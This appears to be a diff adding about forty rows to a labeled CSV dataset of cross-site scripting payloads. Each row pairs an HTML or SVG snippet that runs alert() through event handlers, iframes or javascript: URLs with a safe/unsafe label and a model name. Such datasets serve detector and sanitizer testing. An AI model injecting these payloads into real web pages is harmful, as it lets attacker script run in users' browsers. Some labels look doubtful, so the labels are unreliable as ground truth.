+<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<details ontoggle='alert(\""XSS62\"")'><summary>Click me</summary></details>",Malicious-unsafe,Claude Sonnet 4.5
+"<math href='javascript:alert(\""XSS63\"")'>X</math>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<audio src='x' onerror='alert(\""XSS64\"")'></audio>",Malicious-unsafe,Claude Sonnet 4.5
+"<iframe srcdoc='<script>alert(\""XSS65\"")</script>' onload='alert(\""XSS65\"")'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg><animateMotion onbegin='alert(\""XSS66\"")' dur='1s' repeatCount='1'/></svg>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<input oninvalid='alert(\""XSS67\"")' required>",Malicious-unsafe,Claude Sonnet 4.5
+"<iframe allow='scripts' srcdoc='<script>alert(\""XSS68\"")</script>'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg tabindex='1' onfocusin='alert(\""XSS69\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<video onpause='alert(\""XSS70\"")'></video>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onmouseenter='alert(\""XSS71\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<form oninput='alert(\""XSS72\"")'><input></form>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onwheel='alert(\""XSS73\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<iframe allowfullscreen onload='alert(\""XSS74\"")'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onanimationend='alert(\""XSS75\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<audio onplay='alert(\""XSS76\"")'></audio>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onscroll='alert(\""XSS77\"")' style='overflow:auto;height:10px;'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<iframe seamless onload='alert(\""XSS78\"")'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg oncut='alert(\""XSS79\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg oncopy='alert(\""XSS80\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onpaste='alert(\""XSS81\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onreset='alert(\""XSS82\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onsearch='alert(\""XSS83\"")'></svg>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<svg onselect='alert(\""XSS84\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onshow='alert(\""XSS85\"")'></svg>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<svg ontoggle='alert(\""XSS86\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg ontransitionend='alert(\""XSS87\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onunload='alert(\""XSS88\"")'></svg>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<svg onvolumechange='alert(\""XSS89\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onwaiting='alert(\""XSS90\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onwheel='alert(\""XSS91\"")' style='animation:spin 1s linear infinite'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onpointercancel='alert(\""XSS92\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onpointerout='alert(\""XSS93\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onpointerover='alert(\""XSS94\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onpointerup='alert(\""XSS95\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onselectstart='alert(\""XSS96\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg tabindex='0' onshow='alert(\""XSS97\"")'></svg>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<svg onstalled='alert(\""XSS98\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onsubmit='alert(\""XSS99\"")'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onunload='alert(\""XSS100\"")'><script>alert('XSS100')</script></svg>",MaliciousIntended-but-safe,Claude Sonnet 4.5
